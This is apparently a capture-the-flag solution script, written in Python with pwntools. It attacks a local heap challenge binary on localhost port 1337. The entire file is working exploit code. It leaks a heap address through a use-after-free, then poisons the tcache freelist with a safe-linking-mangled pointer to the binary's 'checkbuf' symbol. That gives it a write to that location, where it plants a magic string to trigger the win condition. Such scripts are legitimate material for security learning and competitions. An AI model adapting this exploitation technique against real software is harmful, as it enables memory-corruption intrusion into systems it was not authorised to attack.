from pwn import *

p = remote("localhost", 1337)

def create(idx: int):
    p.sendlineafter(b"> ", b"0")
    p.sendlineafter(b"> ", f"{idx}".encode())

def free(idx: int):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"> ", f"{idx}".encode())

def set(idx: int, data: bytes):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"> ", f"{idx}".encode())
    p.sendafter(b"> ", data.ljust(0x67, b"\0"))

def get(idx: int):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"> ", f"{idx}".encode())
    p.recvuntil(b"> ")
    return p.recvline(keepends=False)

file = ELF("./chal", checksec=False)

create(0)
create(1)
free(0)
leak = get(0)
leak = u64(leak[0:8]) << 12
log.info(f"{leak = :#x}")

loc = leak + 0x390
free(1)
set(1, p64((loc >> 12) | file.sym.checkbuf))

create(2)
create(3)
set(3, b"ALL HAIL OUR LORD AND SAVIOR TEEMO")
p.sendlineafter(b"> ", b"67")

p.interactive()